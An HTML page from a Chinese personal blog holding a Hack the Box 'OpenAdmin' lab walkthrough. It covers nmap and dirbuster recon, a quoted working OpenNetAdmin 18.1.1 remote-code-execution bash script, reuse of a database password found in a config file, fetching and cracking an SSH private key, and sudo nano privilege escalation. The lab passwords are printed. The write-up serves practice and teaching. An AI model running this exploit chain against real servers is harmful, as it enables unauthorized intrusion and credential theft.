@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这次做靶机学到不少东西，果然还是要细细的做，把问题都弄懂。 探测nmap扫端口，扫下来发现只开放了22和80端口，那就先从80端口开始看看吧。 1nmap -sS -Pn 10.10.10.171 -p-   80端口打开之后是apache服务器的配置完成页面，robots.txt文件没有什么东西，dirbuster走一波，这里字典选择的是directory-list-2.3-medium.t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack the Box-OpenAdmin">
+<meta property="og:url" content="http://ama666.cn/2020/03/27/Hack-the-Box-OpenAdmin/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="前言这次做靶机学到不少东西，果然还是要细细的做，把问题都弄懂。 探测nmap扫端口，扫下来发现只开放了22和80端口，那就先从80端口开始看看吧。 1nmap -sS -Pn 10.10.10.171 -p-   80端口打开之后是apache服务器的配置完成页面，robots.txt文件没有什么东西，dirbuster走一波，这里字典选择的是directory-list-2.3-medium.t">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328125827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131734.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328132031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133403.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133855.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134033.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328154002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134540.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134852.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328135443.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328135532.png">
+<meta property="og:updated_time" content="2020-03-28T22:46:40.973Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hack the Box-OpenAdmin">
+<meta name="twitter:description" content="前言这次做靶机学到不少东西，果然还是要细细的做，把问题都弄懂。 探测nmap扫端口，扫下来发现只开放了22和80端口，那就先从80端口开始看看吧。 1nmap -sS -Pn 10.10.10.171 -p-   80端口打开之后是apache服务器的配置完成页面，robots.txt文件没有什么东西，dirbuster走一波，这里字典选择的是directory-list-2.3-medium.t">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328125827.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2020/03/27/Hack-the-Box-OpenAdmin/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Hack the Box-OpenAdmin | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2020/03/27/Hack-the-Box-OpenAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Hack the Box-OpenAdmin
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-28 12:50:39" itemprop="dateCreated datePublished" datetime="2020-03-28T12:50:39+08:00">2020-03-28</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-03-29 06:46:40" itemprop="dateModified" datetime="2020-03-29T06:46:40+08:00">2020-03-29</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次做靶机学到不少东西，果然还是要细细的做，把问题都弄懂。</p>
+<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>nmap扫端口，扫下来发现只开放了22和80端口，那就先从80端口开始看看吧。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn 10.10.10.171 -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328125827.png" alt></p>
+<p>80端口打开之后是apache服务器的配置完成页面，robots.txt文件没有什么东西，dirbuster走一波，这里字典选择的是<code>directory-list-2.3-medium.txt</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131247.png" alt></p>
+<p>完全扫完目录要等很久，基本上不会有什么太大区别，直接开始看一看各个目录。这里的ona很好奇是什么，google一下发现是一个全名叫做<code>OpenNetAdmin</code>的管理平台，和题目名称相似度很高，值得怀疑。点进去看一看，发现了重要的版本信息。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131600.png" alt></p>
+<h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><p>直接谷歌搜索漏洞，很幸运第一个就看起来能用</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328131734.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span><br><span class="line"><span class="meta">#</span> Date: 2019-11-19</span><br><span class="line"><span class="meta">#</span> Exploit Author: mattpascoe</span><br><span class="line"><span class="meta">#</span> Vendor Homepage: http://opennetadmin.com/</span><br><span class="line"><span class="meta">#</span> Software Link: https://github.com/opennetadmin/ona</span><br><span class="line"><span class="meta">#</span> Version: v18.1.1</span><br><span class="line"><span class="meta">#</span> Tested on: Linux</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Exploit Title: OpenNetAdmin v18.1.1 RCE</span><br><span class="line"><span class="meta">#</span> Date: 2019-11-19</span><br><span class="line"><span class="meta">#</span> Exploit Author: mattpascoe</span><br><span class="line"><span class="meta">#</span> Vendor Homepage: http://opennetadmin.com/</span><br><span class="line"><span class="meta">#</span> Software Link: https://github.com/opennetadmin/ona</span><br><span class="line"><span class="meta">#</span> Version: v18.1.1</span><br><span class="line"><span class="meta">#</span> Tested on: Linux</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">URL="$&#123;1&#125;"</span><br><span class="line">while true;do</span><br><span class="line"> echo -n "$ "; read cmd</span><br><span class="line"> curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$&#123;cmd&#125;;echo \"END\"&amp;xajaxargs[]=ping" "$&#123;URL&#125;" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>虽然不清楚利用原理但是代码逻辑还是很清晰的，输入一个参数URL就好，保存本地运行一下，直接get shell。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328132031.png" alt></p>
+<h2 id="获取用户"><a href="#获取用户" class="headerlink" title="获取用户"></a>获取用户</h2><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>看一下靶机中有哪些用户，jimmy和joanna用户看起来就是目标用户。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133218.png" alt></p>
+<p>先看一下当前目录下都有什么东西，注意到有一个叫做<code>config</code>的目录，怀疑里面有一些可以暴露信息的配置文件。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133403.png" alt></p>
+<p>该目录下一共有两个文件<code>auth_ldap.config.php</code>和<code>config.inc.php</code>。前者的内容没有什么有价值的信息，后者的配置文件中引入了用户本地化的设置和数据库设置。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133708.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328133855.png" alt></p>
+<p>跟随前面所读取到的路径进入两个配置文件，第一个配置文件并不存在，第二个配置文件中暴露了数据库的密码信息为<code>n1nj4W4rri0R!</code>。将此密码尝试和jimmy和joanna用户进行匹配之后发现位jimmy的ssh密码，成功获取到了用户。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134033.png" alt></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>其实第二个方式是我最开始想到的方法，只不过因为有点简单会剧透，所以放在第二个方法来说。使用以下命令来寻找文件中包含“passwd”、“password”等等一系列可能表示暴露口令的字符串就可以找到密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn “passwd” ./</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328154002.png" alt></p>
+<h3 id="joanna"><a href="#joanna" class="headerlink" title="joanna"></a>joanna</h3><p>登录到jimmy用户的目录下，发现并没有想要的文件user.txt。那么就是说user flag在joanna用户的目录下。那么就向joanna发起进攻。首先现在我们只有jimmy用户，所以先执行如下命令找一找jimmy用户可以进入那些目录。</p>
+<p>发现此用户拥有<code>/var/www/internal/</code>目录的权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -user jimmy</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134326.png" alt></p>
+<p>进入这个目录，其中包含了三个文件:<code>login.php</code>、<code>logout.php</code>和<code>main.php</code>。在第三个文件中发现了如下图中的语句。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134418.png" alt></p>
+<p>那么是不是只要执行这个php文件就可以获取到joanna的私钥了？赶紧执行以下，果然还是跳出了permission denied。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134448.png" alt></p>
+<p>看一下端口状态，发现有个可疑的高端口建立了tcp连接，会不会是正在执行这个文件呢？</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134540.png" alt></p>
+<p>使用curl访问一下这个地址，返回了login.php的源代码，看来这个端口就是用来执行<code>/var/www/internal</code>目录中的文件的，赶紧访问一下main.php，惊喜的发现了私钥。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134626.png" alt></p>
+<p>可是我开始疑惑，<code>/var/www/internal</code>目录是属于jimmy用户的，同时之前的步骤也证实了jimmy是没有权限获取joanna目录的文件的。我先讲main.php文件中获取rsa私钥的那句话注释掉，再访问52846端口，发现更改后的文件被执行了，没有获取到私钥。接着我又将注释取消再次访问端口，rsa私钥被重新获取了。为什么呢？是什么进程执行了这个文件，并且拥有joanna目录的权限？我在这里想了很久没想通，后来问了一位朋友，在他指导下发现了在apache配置文件路径<code>/etc.apache2/sites-available</code>中有一个internal.conf文件，配置了一个虚拟主机，运行在52846端口，文件路径就是<code>/var/www/internal</code>，并且以joanna用户运行。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134728.png" alt></p>
+<p>问题解决之后就可以愉快的继续做靶机了。将joanna的私钥下载到本地快乐连接ssh，发现需要<code>passphrase</code>，可以理解为保护rsa私钥的口令。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328134852.png" alt></p>
+<p>用开膛手杰克<code>john the ripper</code>工具破解一发，血腥忍者<code>bloodninjas</code>。</p>
+<p>![image-20200328135352945](/Users/ama666/Library/Application Support/typora-user-images/image-20200328135352945.png)</p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>root权限的获取很简单，查看一下joanna能以root权限执行的命令。看到有一个不用密码就能执行的命令。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328135443.png" alt></p>
+<p>打开nano，control+R读取文件，直接获得root.txt。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20200328135532.png" alt></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2020/03/27/Hack-the-Box-OpenAdmin/" title="Hack the Box-OpenAdmin">http://ama666.cn/2020/03/27/Hack-the-Box-OpenAdmin/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/22/Hack-the-Box-FreeLancer/" rel="next" title="Hack the Box-FreeLancer">
+                <i class="fa fa-chevron-left"></i> Hack the Box-FreeLancer
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/02/Hack-the-Box-Resolute/" rel="prev" title="Hack-the-Box Resolute">
+                Hack-the-Box Resolute <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">66</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#探测"><span class="nav-number">2.</span> <span class="nav-text">探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE"><span class="nav-number">3.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取用户"><span class="nav-number">4.</span> <span class="nav-text">获取用户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法一"><span class="nav-number">4.0.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法二"><span class="nav-number">4.0.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#joanna"><span class="nav-number">4.1.</span> <span class="nav-text">joanna</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-number">5.</span> <span class="nav-text">Root</span></a></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
